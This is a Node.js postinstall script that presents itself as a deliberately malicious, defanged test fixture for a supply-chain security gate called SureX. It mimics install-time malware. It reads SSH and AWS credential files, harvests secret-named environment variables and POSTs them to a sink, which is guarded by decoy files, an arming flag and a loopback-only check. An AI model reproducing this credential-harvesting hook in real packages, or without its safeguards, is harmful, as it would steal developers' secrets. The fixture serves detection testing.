#!/usr/bin/env node
/*
 * ===========================================================================
 *  DELIBERATELY MALICIOUS FIXTURE — authored by the SureX project.
 *  DO NOT INSTALL. DO NOT PUBLISH. Written to LOOK malicious on purpose, so the
 *  SureX gate and reviewer have a real subject to catch.
 *  Why it is harmless to execute: packages/fixtures/MALICIOUS.md.
 * ===========================================================================
 *
 * THE PAYLOAD. This is the file `package.json`'s `postinstall` hook runs at
 * install time. In real supply-chain malware this is where the damage happens
 * before anyone reviews a line of the server: it reads the developer's SSH key
 * and cloud credentials and phones them home the moment `npm install` completes.
 *
 * IT NEVER RUNS HERE. This package is never installed (it is not a workspace
 * member and no install step is ever executed against it — see MALICIOUS.md), so
 * the hook never fires. And even if someone ran this file by hand, it is inert:
 *   - the "credentials" it reads are decoys inside this package,
 *   - the env harvest stays in a local variable,
 *   - the outbound send is skipped unless SUREX_FIXTURE_ARM=1 and refused for any
 *     non-loopback sink,
 *   - so its only default, real effect is a log line and a touch-file INSIDE
 *     this package's fixture-home.
 */

import fs from 'node:fs';
import path from 'node:path';
import { pathToFileURL } from 'node:url';
import {
  ensureDecoys,
  FIXTURE_HOME,
  DECOY_SSH_KEY_PATH,
  DECOY_AWS_CREDENTIALS_PATH,
  assertInsidePackage,
  assertLoopbackSink,
  sinkUrl,
  armed,
} from '../src/safety.mjs';

/** The touch-file the inert run leaves behind, so the demo can prove it ran and did nothing else. */
export const MARKER_FILE = path.join(FIXTURE_HOME, 'POSTINSTALL_RAN.txt');

export async function runPostinstall() {
  ensureDecoys();

  // Read the "private key" and "cloud credentials" — the classic install-time grab.
  let ssh = '';
  let aws = '';
  try { ssh = fs.readFileSync(assertInsidePackage(DECOY_SSH_KEY_PATH), 'utf8'); } catch { ssh = '(decoy ssh key not found)'; }
  try { aws = fs.readFileSync(assertInsidePackage(DECOY_AWS_CREDENTIALS_PATH), 'utf8'); } catch { aws = '(decoy aws credentials not found)'; }

  // Harvest token-shaped env.
  const harvested = {};
  for (const [k, v] of Object.entries(process.env)) {
    if (/token|secret|key|password|api/i.test(k)) harvested[k] = v;
  }

  // The outbound send that would carry the loot — off unless armed, loopback-only.
  const sink = sinkUrl();
  const body = JSON.stringify({ ssh, aws, env: harvested, at: Date.now() });
  let sent = false;
  if (armed()) {
    try {
      assertLoopbackSink(sink);
      await fetch(sink, { method: 'POST', headers: { 'content-type': 'application/json' }, body });
      sent = true;
    } catch {
      /* inert: refused or unreachable */
    }
  }

  // The only default, real effect: a log and a touch-file inside fixture-home.
  fs.writeFileSync(assertInsidePackage(MARKER_FILE), `postinstall ran at ${new Date().toISOString()} — inert (sent=${sent})\n`, 'utf8');
  console.error(`[surex-mal-postinstall] postinstall would exfiltrate ${ssh.length + aws.length} credential bytes and ${Object.keys(harvested).length} env var(s) — inert (sent=${sent}). See MALICIOUS.md.`);
  return { credBytes: ssh.length + aws.length, envKeys: Object.keys(harvested).length, sent };
}

// Run only when invoked directly (as the postinstall hook would). Imported by a
// test, this does nothing.
if (process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href) {
  runPostinstall().catch((err) => {
    console.error('[surex-mal-postinstall] postinstall fatal:', err);
    process.exit(0); // never fail an install — malware stays quiet
  });
}
